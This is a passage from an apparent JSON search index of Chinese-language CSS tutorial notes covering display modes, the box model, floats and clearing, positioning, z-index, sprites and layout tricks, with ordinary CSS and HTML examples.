行内元素\",\"slug\":\"_1-2-行内元素\",\"contents\":[\"<!-- 文本标签 --> <br>、<em>、<strong>、<sup>、<sub>、<del>、<ins> <!-- 其它标签 --> <a>与<label> \",\"<span> 标签是最典型的行内元素。有的地方也将行内元素称为内联元素\",\"行内元素的特点：\",\"在页面中不独占一行，一行中不能容纳下的行内元素，会在下一行继续从左到右排列\",\"默认宽度：由内容撑开\",\"默认高度：由内容撑开\",\"无法通过 CSS 设置宽高\",\"注意：\",\"链接里面不能再放链接\",\"特殊情况链接 <a> 里面可以放块级元素，但是给 <a> 转换成块级模式最安全\"]},{\"header\":\"1.3 行内块元素\",\"slug\":\"_1-3-行内块元素\",\"contents\":[\"<!-- 图片 --> <img> <!-- 单元格 --> <td>、<th> <!-- 表单控件 --> <input>、<textarea>、<select>、<button> <!-- 框架标签 --> <iframe> \",\"它们同时具有块元素和行内元素的特点\",\"行内块元素的特点：\",\"在页面中不独占一行，一行中不能容纳下的行内元素，会在下一行继续从左到右排 列\",\"默认宽度：由内容撑开\",\"默认高度：由内容撑开\",\"可以通过 CSS 设置宽高\"]},{\"header\":\"1.4 总结\",\"slug\":\"_1-4-总结\",\"contents\":[\"元素模式\",\"元素排列\",\"设置样式\",\"默认宽度\",\"包含\",\"块级元素\",\"一行只能放一个块级元素\",\"可以设置宽度高度\",\"容器的 100%\",\"容器可以包含任何标签\",\"行内元素\",\"一行可以放多个行内元素\",\"不可以直接设置宽度高度\",\"它本身内容的宽度\",\"容纳文本或其他行内元素\",\"行内块元素\",\"一行放多个行内块元素\",\"可以设置宽度和高度\",\"它本身内容的宽度\"]},{\"header\":\"2. 元素显示模式的转换\",\"slug\":\"_2-元素显示模式的转换\",\"contents\":[\"通过 CSS 中的 display 属性可以修改元素的默认显示模式\",\"转换方式：\",\"转换为块元素：display: block;\",\"转换为行内元素：display: inline;\",\"转换为行内块：display: inline-block;\",\"隐藏：display: none;\"]}]},\"/front-end/css-notes/07-CSS%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B.html\":{\"title\":\"CSS盒子模型\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS 会把所有的 HTML 元素都看成一个盒子，所有的样式也都是基于这个盒子\",\"margin（外边距）： 盒子与外界的距离\",\"border（边框）： 盒子的边框\",\"padding（内边距）： 紧贴内容的补白区域\",\"content（内容）：元素中的文本或后代元素都是它的内容\",\"CSS盒子模型01.png\",\"盒子的大小=content+左右padding+左右border\",\"注意：外边距 margin 不会影响盒子的大小，但会影响盒子的位置\"]},{\"header\":\"1. 盒子内容区（content）\",\"slug\":\"_1-盒子内容区-content\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"width\",\"设置内容区域宽度\",\"长度\",\"max-width\",\"设置内容区域的最大宽度\",\"长度\",\"min-width\",\"设置内容区域的最小宽度\",\"长度\",\"height\",\"设置内容区域高度\",\"长度\",\"max-height\",\"设置内容区域的最大高度\",\"长度\",\"min-height\",\"设置内容区域的最小高度\",\"长度\",\"注意：\",\"max-width 、 min-width 一般不与 width 一起使用\",\"max-height 、 min-height 一般不与 height 一起使用\"]},{\"header\":\"2. 盒子内边距（padding）\",\"slug\":\"_2-盒子内边距-padding\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"padding-top\",\"上内边距\",\"长度\",\"padding-right\",\"右内边距\",\"长度\",\"padding-bottom\",\"下内边距\",\"长度\",\"padding-left\",\"左内边距\",\"长度\",\"padding\",\"复合属性\",\"长度，可以设置 1~4 个值\",\"padding 复合属性的使用规则：\",\"padding: 10px; 四个方向内边距都是 10px\",\"padding: 10px 20px; 上下 10px ，左右 20px 。（上下、左右）\",\"padding: 10px 20px 30px; 上 10px ，左右 20px ，下 30px 。（上、左右、下）\",\"padding: 10px 20px 30px 40px; 上 10px ，右 20px ，下 30px ，左 40px 。（上、右、下、左）\",\"注意点：\",\"padding 的值不能为负数\",\"行内元素的左右内边距是没问题的，上下内边距不能完美的设置\",\"块级元素、行内块元素，四个方向内边距都可以完美设置\"]},{\"header\":\"3. 盒子边框（border）\",\"slug\":\"_3-盒子边框-border\",\"contents\":[\"border 可以设置元素的边框\",\"边框由三部分组成：边框宽度 (粗细)、边框样式、边框颜色\",\"语法：\",\"border : border-width || border-style || border-color; \",\"属性\",\"作用\",\"border-width\",\"定义边框粗细，单位是 px\",\"border-style\",\"边框的样式\",\"border-color\",\"边框颜色\",\"边框样式 border-style 可以设置如下值：\",\"none：没有边框即忽略所有边框的宽度（默认值）\",\"solid：边框为单实线 (最为常用的)\",\"dashed：边框为虚线\",\"dotted：边框为点线\",\"边框简写：\",\"border: 1px solid red; /* 没有顺序 */ \",\"边框分开写法：\",\"border-top: 1px solid red; /* 只设定上边框， 其余同理 */ \"]},{\"header\":\"4. 盒子外边距（margin）\",\"slug\":\"_4-盒子外边距-margin\",\"contents\":[\"margin 属性用于设置外边距，即控制盒子和盒子之间的距离\",\"属性\",\"作用\",\"margin-left\",\"左外边距\",\"margin-right\",\"右外边距\",\"margin-top\",\"上外边距\",\"margin-bottom\",\"下外边距\"]},{\"header\":\"4.1 margin注意事项\",\"slug\":\"_4-1-margin注意事项\",\"contents\":[\"子元素的 margin ，是参考父元素的 content 计算的。（因为是父亲的 content 中承装着子元素）\",\"上 margin 、左 margin ：影响自己的位置；下 margin 、右 margin ：影响后面兄弟元素的位置\",\"块级元素、行内块元素，均可以完美地设置四个方向的 margin ；但行内元素，左右 margin 可以完美设置，上下 margin 设置无效\",\"margin 的值也可以是 auto ，如果给一个块级元素设置左右 margin 都为 auto ，该块级元素会在父元素中水平居中\",\"margin 的值可以是负值\"]},{\"header\":\"4.2 margin塌陷问题\",\"slug\":\"_4-2-margin塌陷问题\",\"contents\":[]},{\"header\":\"4.2.1 什么时候出现\",\"slug\":\"_4-2-1-什么时候出现\",\"contents\":[\"垂直方向\",\"块级元素，不是行内元素，也不是行内块级元素\"]},{\"header\":\"4.2.2 外边距计算规则\",\"slug\":\"_4-2-2-外边距计算规则\",\"contents\":[\"两数均为正数时：取最大的数\",\"两数均为负数时：取绝对值最大的数\",\"一正一负时：取两数相加的和\"]},{\"header\":\"4.2.3 上下外边距相遇\",\"slug\":\"_4-2-3-上下外边距相遇\",\"contents\":[\"当上下相邻的两个块元素（兄弟关系）相遇时，如果上面的元素有下外边距 margin-bottom，下面的元素有上外边距 margin-top ，则他们之间会出现margin塌陷问题\",\"上述案例中A与B盒子之间间距实际为20px\",\"上述案例中A与B盒子之间间距实际为-20px\",\"上述案例中A与B盒子之间间距实际为10px\",\"解决方案：尽量只给一个盒子添加 margin 值\"]},{\"header\":\"4.2.4 父子元素之间的外边距相遇\",\"slug\":\"_4-2-4-父子元素之间的外边距相遇\",\"contents\":[\"第一个子元素的margin-top会作用在父元素上，最后一个子元素的margin-bottom会作用在父元素上\",\"上述案例中C与B盒子之间间距实际为20px\",\"解决方案：\",\"可以为子元素设置绝对定位，父元素设置相对定位\",\"可以为父元素定义上（下）边框（border）\",\"可以为父元素定义上（下）内边距（padding）\",\"可以为父元素添加 overflow:hidden（即触发BFC）\"]}]},\"/front-end/css-notes/08-CSS%E5%85%83%E7%B4%A0%E6%98%BE%E7%A4%BA%E4%B8%8E%E9%9A%90%E8%97%8F.html\":{\"title\":\"CSS元素显示与隐藏\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"目的：让一个元素在页面中消失或者显示出来\",\"场景：类似网站广告，当我们点击关闭就不见了，但是我们重新刷新页面，会重新出现\"]},{\"header\":\"1. display显示\",\"slug\":\"_1-display显示\",\"contents\":[\"display 属性用于设置一个元素应如何显示\",\"display: none； /* 隐藏对象 */ display：block；/* 除了转换为块级元素之外，同时还有显示元素的意思 */ \",\"特点： display 隐藏元素后，不再占有原来的位置\"]},{\"header\":\"2. visibility可见性\",\"slug\":\"_2-visibility可见性\",\"contents\":[\"visibility 属性用于指定一个元素应可见还是隐藏\",\"visibility：visible; /* 元素可视 */ visibility：hidden; /* 元素隐藏 */ \",\"特点：visibility 隐藏元素后，继续占有原来的位置\",\"如果隐藏元素想要原来位置，就用 visibility:hidden;\",\"如果隐藏元素不想要原来位置，就用 display:none;\"]},{\"header\":\"3. overflow溢出\",\"slug\":\"_3-overflow溢出\",\"contents\":[\"overflow 属性指定了如果内容溢出一个元素的框（超过其指定高度及宽度） 时，会发生什么\",\"属性值\",\"描述\",\"visible\",\"不剪切内容也不添加滚动条\",\"hidden\",\"不显示超过对象尺寸的内容，超出的部分隐藏掉\",\"scroll\",\"不管超出内容否，总是显示滚动条\",\"auto\",\"超出自动显示滚动条，不超出不显示滚动条\",\"一般情况下，我们都不想让溢出的内容显示出来，因为溢出的部分会影响布局\",\"但是如果有定位的盒子，请慎用 overflow:hidden 因为它会隐藏多余的部分\",\"用途\",\"清除浮动\",\"保证盒子里面的内容不会超出该盒子范围\"]},{\"header\":\"4. 显示与隐藏总结\",\"slug\":\"_4-显示与隐藏总结\",\"contents\":[\"属性\",\"区别\",\"用途\",\"display 显示\",\"隐藏对象，不保留位置\",\"配合后面 js 做特效，比如下拉菜单，原先没有，鼠标经过，显示下拉菜单，应用极为广泛\",\"visibility 可见性\",\"隐藏对象，保留位置\",\"使用较少\",\"overflow 溢出\",\"只是隐藏超出大小的部分\",\"1. 可以清除浮动2. 保证盒子里面的内容不会超出该盒子范围\"]}]},\"/front-end/css-notes/09-CSS%E4%BC%A0%E7%BB%9F%E7%BD%91%E9%A1%B5%E5%B8%83%E5%B1%80%E6%96%B9%E5%BC%8F.html\":{\"title\":\"CSS传统网页布局方式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS 提供了三种传统布局方式 (简单说, 就是盒子如何进行排列)：\",\"普通流（标准流）\",\"浮动\",\"定位\",\"这三种布局方式都是用来摆放盒子的，盒子摆放到合适位置，布局自然就完成了\",\"注意：实际开发中，一个页面基本都包含了这三种布局方式\"]},{\"header\":\"1. 标准流（普通流/文档流）\",\"slug\":\"_1-标准流-普通流-文档流\",\"contents\":[\"所谓的标准流: 就是标签按照规定好默认方式排列\",\"块级元素会独占一行，从上向下顺序排列 \",\"常用元素：div、hr、p、h1~h6、ul、ol、dl、form、table\",\"行内元素会按照顺序，从左到右顺序排列，碰到父元素边缘则自动换行 \",\"常用元素：span、a、i、em 等\",\"标准流是最基本的布局方式\"]},{\"header\":\"2. 浮动\",\"slug\":\"_2-浮动\",\"contents\":[]},{\"header\":\"2.1 为什么需要浮动\",\"slug\":\"_2-1-为什么需要浮动\",\"contents\":[\"有很多的布局效果，标准流没有办法完成，此时就可以利用浮动完成布局。因为浮动可以改变元素标签默认的排列方式\",\"浮动最典型的应用：可以让多个块级元素一行内排列显示\",\"网页布局第一准则：多个块级元素纵向排列找标准流，多个块级元素横向排列找浮动\"]},{\"header\":\"2.2 什么是浮动\",\"slug\":\"_2-2-什么是浮动\",\"contents\":[\"float 属性用于创建浮动框，将其移动到一边，直到左边缘或右边缘触及块或另一个浮动框的边缘\",\"语法：\",\" 选择器 { float: 属性值; } \",\"属性值\",\"描述\",\"none\",\"元素不浮动（默认值）\",\"left\",\"元素向左浮动\",\"right\",\"元素向右浮动\"]},{\"header\":\"2.3 浮动特性\",\"slug\":\"_2-3-浮动特性\",\"contents\":[\"加了浮动之后的元素, 会具有很多特性：\",\"浮动元素会脱离标准流 (脱标：浮动的盒子不再保留原先的位置)\",\"CSS传统网页布局方式01.png\",\"浮动的元素会一行内显示并且元素顶部对齐\",\"注意：浮动的元素是互相贴靠在一起的（不会有缝隙），如果父级宽度装不下这些浮动的盒子，多出的盒子会另起一行对齐\",\"浮动的元素会具有行内块元素的特性\",\"任何元素都可以浮动，如果块级盒子没有设置宽度，默认宽度和父级一样宽，但是添加浮动后，它的大小根据内容来决定\",\"浮动的盒子中间是没有缝隙的\"]},{\"header\":\"2.4 浮动布局注意点\",\"slug\":\"_2-4-浮动布局注意点\",\"contents\":[\"浮动和标准流的父盒子搭配\",\"为了约束浮动元素位置, 我们网页布局一般采取的策略是：先用标准流父元素排列上下位置, 之后内部子元素采取浮动排列左右位置，符合网页布局第一准侧\",\"CSS传统网页布局方式02.png\",\"先用标准流的父元素排列上下位置, 之后内部子元素采取浮动排列左右位置\",\"一个元素浮动了，理论上其余的兄弟元素也要浮动\",\"一个盒子里面有多个子盒子，如果其中一个盒子浮动了，其他兄弟也应该浮动，以防止引起问题\",\"浮动的盒子只会影响浮动盒子后面的标准流, 不会影响前面的标准流\"]},{\"header\":\"2.5 清除浮动\",\"slug\":\"_2-5-清除浮动\",\"contents\":[]},{\"header\":\"2.5.1 为什么需要清除浮动\",\"slug\":\"_2-5-1-为什么需要清除浮动\",\"contents\":[\"由于父级盒子很多情况下，不方便给高度，但是子盒子浮动又不占有位置，最后父级盒子高度为 0 时，就会影响下面的标准流盒子\"]},{\"header\":\"2.5.2 清除浮动本质\",\"slug\":\"_2-5-2-清除浮动本质\",\"contents\":[\"清除浮动的本质是清除浮动元素造成的影响：浮动的子标签无法撑开父盒子的高度\",\"注意：\",\"如果父盒子本身有高度，则不需要清除浮动\",\"清除浮动之后，父级就会根据浮动的子盒子自动检测高度，父级有了高度，就不会影响下面的标准流了\"]},{\"header\":\"2.5.3 清除浮动样式\",\"slug\":\"_2-5-3-清除浮动样式\",\"contents\":[\"语法：\",\" 选择器{clear:属性值;} \",\"属性值\",\"描述\",\"left\",\"不允许左侧有浮动元素（清除左侧浮动的影响）\",\"right\",\"不允许右侧有浮动元素（清除右侧浮动的影响）\",\"both\",\"同时清除左右两侧浮动的影响\",\"清除浮动的策略是: 闭合浮动\"]},{\"header\":\"2.5.4 清除浮动的多种方式\",\"slug\":\"_2-5-4-清除浮动的多种方式\",\"contents\":[]},{\"header\":\"2.5.4.1 额外标签法\",\"slug\":\"_2-5-4-1-额外标签法\",\"contents\":[\"额外标签法也称为隔墙法，是 W3C 推荐的做法\",\"使用方式：额外标签法会在浮动元素末尾添加一个空的标签\",\"例如 <div style=\\\"clear:both\\\"></div>，或者其他标签（如<br/>等） \",\"优点： 通俗易懂，书写方便\",\"缺点： 添加许多无意义的标签，结构化较差\",\"注意： 要求这个新的空标签必须是块级元素\",\"这里我们使用一个p标签来清除浮动\"]},{\"header\":\"2.5.4.2 父级添加overflow属性\",\"slug\":\"_2-5-4-2-父级添加overflow属性\",\"contents\":[\"可以给父级添加 overflow 属性，将其属性值设置为 hidden、 auto 或 scroll\",\"例如：\",\"overflow:hidden | auto | scroll; \",\"优点：代码简洁\",\"缺点：无法显示溢出的部分\",\"注意：是给父元素添加代码\"]},{\"header\":\"2.5.4.3 父级添加after伪元素\",\"slug\":\"_2-5-4-3-父级添加after伪元素\",\"contents\":[\":after 方式是额外标签法的升级版，给父元素添加：\",\" .clearfix:after { content: \\\"\\\"; display: block; height: 0; clear: both; visibility: hidden; } .clearfix { /* IE6、7 专有 */ *zoom: 1; } \",\"优点：没有增加标签，结构更简单\",\"缺点：兼容性问题\"]},{\"header\":\"2.5.4.4 父级添加双伪元素\",\"slug\":\"_2-5-4-4-父级添加双伪元素\",\"contents\":[\"给父元素添加：\",\" .clearfix:before,.clearfix:after { content:\\\"\\\"; display:table; } .clearfix:after { clear:both; } .clearfix { *zoom:1; /* IE6、7 专有 */ } \",\"优点：代码更简洁\",\"缺点：兼容性问题\"]},{\"header\":\"2.6 总结\",\"slug\":\"_2-6-总结\",\"contents\":[\"为什么需要清除浮动？\",\"父级没高度\",\"子盒子浮动了\",\"影响下面布局了，我们就应该清除浮动了\",\"清除浮动的方式\",\"优点\",\"缺点\",\"额外标签法\",\"通俗易懂，书写方便\",\"添加许多无意义的标签，结构化较差\",\"父级 overflow:hidden;\",\"书写简单\",\"溢出隐藏\",\"父级 after 伪元素\",\"结构语义化，代码简洁\",\"兼容性问题\",\"父级双伪元素\",\"结构语义化，代码简洁\",\"兼容性问题\"]},{\"header\":\"3. 定位\",\"slug\":\"_3-定位\",\"contents\":[]},{\"header\":\"3.1 为什么使用定位\",\"slug\":\"_3-1-为什么使用定位\",\"contents\":[\"浮动可以让多个块级盒子一行没有缝隙排列显示，经常用于横向排列盒子\",\"定位则是可以让盒子自由的在某个盒子内移动位置或者固定屏幕中某个位置，并且可以压住其他盒子\"]},{\"header\":\"3.2 定位组成\",\"slug\":\"_3-2-定位组成\",\"contents\":[\"定位：将盒子定在某一个位置，所以定位也是在摆放盒子，按照定位的方式移动盒子\",\"定位也是用来布局的，它有两部分组成：定位 = 定位模式 + 边偏移\",\"定位模式 用于指定一个元素在文档中的定位方式\",\"边偏移则决定了该元素的最终位置\"]},{\"header\":\"3.2.1 边偏移（方位名词）\",\"slug\":\"_3-2-1-边偏移-方位名词\",\"contents\":[\"边偏移 就是定位的盒子移动到最终位置。有 top、bottom、left 和 right 4 个属性\",\"边偏移属性\",\"示例\",\"描述\",\"top\",\"top: 80px\",\"顶端偏移量，定义元素相对于其父元素上边线的距离\",\"bottom\",\"bottom: 80px\",\"底部偏移量，定义元素相对于其父元素下边线的距离\",\"left\",\"left: 80px\",\"左侧偏移量，定义元素相对于其父元素左边线的距离\",\"right\",\"right: 80px\",\"右侧偏移量，定义元素相对于其父元素右边线的距离\",\"定位的盒子有了边偏移才有价值。一般情况下，凡是有定位的地方必有边偏移\"]},{\"header\":\"3.2.2 定位模式（position）\",\"slug\":\"_3-2-2-定位模式-position\",\"contents\":[\"在 CSS 中，通过 position 属性定义元素的定位模式，语法如下：\",\"选择器 { position: 属性值; } \",\"定位模式是有不同分类的，在不同情况下，我们用到不同的定位模式\",\"定位模式决定元素的定位方式，它通过 CSS 的 position 属性来设置，其值可以分为四个：\",\"值\",\"语义\",\"static\",\"静态定位\",\"relative\",\"相对定位\",\"absolute\",\"绝对定位\",\"fixed\",\"固定定位\",\"sticky\",\"粘性定位\"]},{\"header\":\"3.2.2.1 静态定位 (static)\",\"slug\":\"_3-2-2-1-静态定位-static\",\"contents\":[\"静态定位是元素的默认定位方式，无定位的意思，在不需要定位的时候用\",\"语法：\",\"选择器 { position: static; } \",\"静态定位按照标准流特性摆放位置，它没有边偏移，静态定位在布局时几乎不用\"]},{\"header\":\"3.2.2.2 相对定位 (relative)\",\"slug\":\"_3-2-2-2-相对定位-relative\",\"contents\":[\"相对定位是元素在移动位置的时候，是相对于它自己原来的位置来说的\",\"语法：\",\"选择器 { position: relative; } \",\"相对定位的特点：（务必记住）\",\"它是相对于自己原来的位置来移动的（移动位置的时候参照点是自己原来的位置）\",\"原来在标准流的位置继续占有，后面的盒子仍然以标准流的方式对待它，因此，相对定位并没有脱标\"]},{\"header\":\"3.2.2.3 绝对定位 (absolute)\",\"slug\":\"_3-2-2-3-绝对定位-absolute\",\"contents\":[]},{\"header\":\"3.2.2.3.1 绝对定位的介绍\",\"slug\":\"_3-2-2-3-1-绝对定位的介绍\",\"contents\":[\"绝对定位是元素在移动位置的时候，是相对于它祖先元素来说的\",\"语法：\",\" 选择器 { position: absolute; } \",\"绝对定位的特点：\",\"完全脱标 —— 完全不占位置\",\"如果没有祖先元素或者祖先元素没有定位，则以浏览器为准定位（Document 文档）\",\"如果祖先元素有定位 (相对、绝对、固定定位)，则以最近一级的有定位祖先元素为参考点移动位置\"]},{\"header\":\"3.2.2.3.2 定位口诀——子绝父相\",\"slug\":\"_3-2-2-3-2-定位口诀——子绝父相\",\"contents\":[\"子级是绝对定位的话，父级要用相对定位\",\"子级绝对定位，不会占有位置，可以放到父盒子里面的任何一个地方，不会影响其他的兄弟盒子\",\"父盒子需要加定位限制子盒子在父盒子内显示\",\"父盒子布局时，需要占有位置，因此父亲只能是相对定位\",\"父级要占有位置，子级要任意摆放这就是子绝父相的由来，所以相对定位经常用来作为绝对定位的父级\",\"总结： 因为父级需要占有位置，因此是相对定位， 子盒子不需要占有位置，则是绝对定位\",\"当然，子绝父相不是永远不变的，如果父元素不需要占有位置，子绝父绝也会遇到\"]},{\"header\":\"3.2.2.4 固定定位 (fixed)\",\"slug\":\"_3-2-2-4-固定定位-fixed\",\"contents\":[\"固定定位是元素固定于浏览器可视区的位置\",\"主要使用场景：可以在浏览器页面滚动时元素的位置不会改变\",\"语法：\",\" 选择器 { position: fixed; } \",\"固定定位的特点：\",\"以浏览器的可视窗口为参照点移动元素\",\"跟父元素没有任何关系\",\"不随滚动条滚动\",\"固定定位不再占有原先的位置\",\"固定定位也是脱标的，其实固定定位也可以看做是一种特殊的绝对定位\"]},{\"header\":\"3.2.2.5 粘性定位 (sticky)\",\"slug\":\"_3-2-2-5-粘性定位-sticky\",\"contents\":[\"粘性定位可以被认为是相对定位和固定定位的混合\",\"语法：\",\" 选择器 { position: sticky; top: 10px; } \",\"粘性定位的特点：\",\"以浏览器的可视窗口为参照点移动元素（固定定位特点）\",\"粘性定位占有原先的位置（相对定位特点）\",\"必须添加 top 、left、right、bottom 其中一个才有效\"]},{\"header\":\"3.2.2.6 总结\",\"slug\":\"_3-2-2-6-总结\",\"contents\":[\"定位模式\",\"是否脱标\",\"移动位置\",\"是否常用\",\"static 静态定位\",\"否 (占有位置)\",\"不能使用边偏移\",\"很少\",\"relative 相对定位\",\"否 (占有位置)\",\"相对于自身位置移动\",\"基本单独使用\",\"absolute 绝对定位\",\"是（不占有位置）\",\"带有定位的父级\",\"要和定位父级元素搭配使用\",\"fixed 固定定位\",\"是（不占有位置）\",\"浏览器可视区\",\"单独使用，不需要父级\",\"sticky 粘性定位\",\"否 (占有位置)\",\"浏览器可视区\",\"当前阶段少\",\"注意：\",\"边偏移需要和定位模式联合使用，单独使用无效\",\"top 和 bottom 不要同时使用\",\"left 和 right 不要同时使用\"]},{\"header\":\"3.3 定位的应用\",\"slug\":\"_3-3-定位的应用\",\"contents\":[\"固定定位小技巧： 固定在版心右侧位置\",\"小算法：\",\"让固定定位的盒子 left: 50%;，走到浏览器可视区（也可以看做版心）的一半位置\",\"让固定定位的盒子 margin-left: 版心宽度的一半距离; 多走版心宽度的一半位置\",\"就可以让固定定位的盒子贴着版心右侧对齐了\"]},{\"header\":\"3.4 定位堆叠顺序 (z-index)\",\"slug\":\"_3-4-定位堆叠顺序-z-index\",\"contents\":[\"在使用定位布局时，可能会出现盒子重叠的情况，此时，可以使用 z-index 来控制盒子的前后次序 (z轴)\",\"语法：\",\"选择器 { z-index: 1; } \",\"z-index 的特性如下：\",\"属性值：正整数、负整数或0，默认值是0，数值越大，盒子越靠上\",\"如果属性值相同，则按照书写顺序，后来者居上\",\"数字后面不能加单位\",\"注意：z-index 只能应用于相对定位、绝对定位和固定定位的元素，其他标准流、浮动和静态定位无效\"]},{\"header\":\"3.5 定位的拓展\",\"slug\":\"_3-5-定位的拓展\",\"contents\":[]},{\"header\":\"3.5.1 绝对定位的盒子居中\",\"slug\":\"_3-5-1-绝对定位的盒子居中\",\"contents\":[\"注意：加了绝对定位/固定定位的盒子不能通过设置 margin: auto 设置水平居中，但是可以通过以下计算方法实现水平和垂直居中，可以按照下图的方法：\",\"left: 50%; 让盒子的左侧移动到父级元素的水平中心位置\",\"margin-left: -x px; 让盒子向左移动自身宽度的一半\"]},{\"header\":\"3.5.2 定位特殊特性\",\"slug\":\"_3-5-2-定位特殊特性\",\"contents\":[\"绝对定位和固定定位也和浮动类似：\",\"行内元素添加绝对或者固定定位，可以直接设置高度和宽度\",\"块级元素添加绝对或者固定定位，如果不给宽度或者高度，默认大小是内容的大小\",\"display 是显示模式，可以改变显示模式有以下方式:\",\"可以用 inline-block 转换为行内块\",\"可以用浮动 float 默认转换为行内块（类似，并不完全一样，因为浮动是脱标的）\",\"绝对定位和固定定位也和浮动类似，默认转换的特性转换为行内块\",\"所以说，一个行内的盒子，如果加了浮动、固定定位和绝对定位，不用转换，就可以给这个盒子直接设置宽度和高度等\"]},{\"header\":\"3.5.3 脱标的盒子不会触发外边距塌陷\",\"slug\":\"_3-5-3-脱标的盒子不会触发外边距塌陷\",\"contents\":[\"浮动元素、绝对定位 (固定定位）元素的都不会触发外边距合并的问题\",\"也就是说，我们给盒子改为了浮动或者定位，就不会有垂直外边距合并的问题\"]},{\"header\":\"3.5.4 绝对定位(固定定位)会完全压住盒子\",\"slug\":\"_3-5-4-绝对定位-固定定位-会完全压住盒子\",\"contents\":[\"浮动元素不同，只会压住它下面标准流的盒子，但是不会压住下面标准流盒子里面的文字，但是绝对定位（固定定位）会压住下面标准流所有的内容\",\"浮动之所以不会压住文字，因为浮动产生的目的最初是为了做文字环绕效果的，文字会围绕浮动元素\"]}]},\"/front-end/css-notes/10-CSS%E7%B2%BE%E7%81%B5%E5%9B%BE.html\":{\"title\":\"CSS精灵图\",\"contents\":[{\"header\":\"1. 为什么需要精灵图\",\"slug\":\"_1-为什么需要精灵图\",\"contents\":[\"一个网页中往往会应用很多小的背景图像作为修饰，当网页中的图像过多时，服务器就会频繁地接收和发送请求图片，造成服务器请求压力过大，这将大大降低页面的加载速度\",\"为了有效地减少服务器接收和发送请求的次数，提高页面的加载速度，出现了 CSS 精灵技术（也称 CSS Sprites、CSS 雪碧图）\",\"核心原理：将网页中的一些小背景图像整合到一张大图中，这样服务器只需要一次请求就可以了\"]},{\"header\":\"2. 精灵图（sprites）的使用\",\"slug\":\"_2-精灵图-sprites-的使用\",\"contents\":[\"使用精灵图核心：\",\"精灵技术主要针对于背景图片使用。就是把多个小背景图片整合到一张大图片中\",\"这个大图片也称为 sprites 精灵图或者雪碧图\",\"移动背景图片位置，此时可以使用 background-position\",\"移动的距离就是这个目标图片的 x 和 y 坐标。注意网页中的坐标有所不同\",\"因为一般情况下都是往上往左移动，所以数值是负值\",\"使用精灵图的时候需要精确测量，每个小背景图片的大小和位置\",\"例：\",\"效果：\",\"CSS精灵图01.png\",\"精灵图：\",\"CSS精灵图02.jpg\",\"结构：\",\"<span class=\\\"p\\\">p</span> <span class=\\\"i\\\">i</span> <span class=\\\"n\\\">n</span> <span class=\\\"k\\\">k</span> \",\"样式：\",\"span { display: inline-block; background: url(images/abcd.jpg) no-repeat; } .p { width: 100px; height: 112px; /* background-color: pink; */ background-position: -493px -276px; } .i { width: 60px; height: 108px; /* background-color: pink; */ background-position: -327px -142px; } .n { width: 108px; height: 109px; /* background-color: pink; */ background-position: -215px -141px; } .k { width: 105px; height: 114px; /* background-color: pink; */ background-position: -495px -142px; } \"]}]},\"/front-end/css-notes/11-CSS%E5%B8%83%E5%B1%80%E6%8A%80%E5%B7%A7.html\":{\"title\":\"CSS布局技巧\",\"contents\":[{\"header\":\"1. margin负值运用\",\"slug\":\"_1-margin负值运用\",\"contents\":[\"让每个盒子 margin 往左侧移动-1px 正好压住相邻盒子边框\",\"鼠标经过某个盒子的时候，提高当前盒子的层级即可（如果没有有定位，则加相对定位（保留位置），如果有定位，则加（z-index）\"]},{\"header\":\"2. 文字围绕浮动元素\",\"slug\":\"_2-文字围绕浮动元素\",\"contents\":[\"利用浮动元素不会压住文字的特性实现\"]},{\"header\":\"3. 行内块巧妙运用\",\"slug\":\"_3-行内块巧妙运用\",\"contents\":[\"页面底部页码栏\",\"页码在页面中间显示:\",\"把这些链接盒子转换为行内块，之后给父级指定 text-align: center;\",\"利用行内块元素中间有缝隙，并且给父级添加 text-align: center; 行内块元素会水平会居中\"]},{\"header\":\"4. CSS三角形\",\"slug\":\"_4-css三角形\",\"contents\":[\"网页中常见一些三角形，使用 CSS 直接画出来就可以，不必做成图片或者字体图标\",\"我们用 CSS 边框可以模拟三角效果\",\"宽度高度为 0\",\"我们 4 个边框都要写，只保留需要的边框颜色，其余的不能省略，都改为 transparent 透明就好了\",\"为了照顾兼容性低版本的浏览器，加上 font-size: 0;line-height: 0;\"]},{\"header\":\"5. 关于默认宽度\",\"slug\":\"_5-关于默认宽度\",\"contents\":[\"所谓的默认宽度，就是不设置 width 属性时，元素所呈现出来的宽度\",\"总宽度 = 父的content - 自身的左右margin\",\"内容区的宽度 = 父的content - 自身的左右margin - 自身的左右border - 自身的左右padding\"]},{\"header\":\"6. 行内元素、行内块元素\",\"slug\":\"_6-行内元素、行内块元素\",\"contents\":[\"行内元素、行内块元素，可以被父元素当做文本处理\"]},{\"header\":\"7. 如何让子元素在父亲中水平居中\",\"slug\":\"_7-如何让子元素在父亲中水平居中\",\"contents\":[\"若子元素为块元素，给父元素加上： margin:0 auto; 若子元素为行内元素、行内块元素，给父元素加上： text-align:center;\"]},{\"header\":\"8. 如何让子元素在父亲中垂直居中\",\"slug\":\"_8-如何让子元素在父亲中垂直居中\",\"contents\":[\"（若想绝对垂直居中，父元素 font-size 设置为 0）\",\"若子元素为块元素，给子元素加上： margin-top ，值为：(父元素content －子元素盒子总高) / 2\",\"若子元素为行内元素、行内块元素：让父元素的 height = line-height ，每个子元素都加上： vertical-align: middle;\"]},{\"header\":\"9. 元素之间的空白问题\",\"slug\":\"_9-元素之间的空白问题\",\"contents\":[\"产生原因：行内元素、行内块元素，彼此之间的换行会被浏览器解析为一个空白字符\",\"解决方案：\",\"方案一： 去掉换行和空格（不推荐）\",\"方案二： 给父元素设置 font-size: 0 ，再给需要显示文字的元素，单独设置字体大小（推荐）\"]},{\"header\":\"10. 行内块的幽灵空白问题\",\"slug\":\"_10-行内块的幽灵空白问题\",\"contents\":[\"产生原因：行内块元素与文本的基线对齐，而文本的基线与文本最底端之间是有一定距离的\",\"解决方案：\",\"方案一： 给行内块设置 vertical-align ，值不为 baseline 即可，设置为 middel 、 bottom 、 top 均可\",\"方案二： 若父元素中只有一张图片，设置图片为 display: block;\",\"方案三： 给父元素设置 font-size: 0;。如果该行内块内部还有文本，则需单独设置 font-size\"]},{\"header\":\"11. 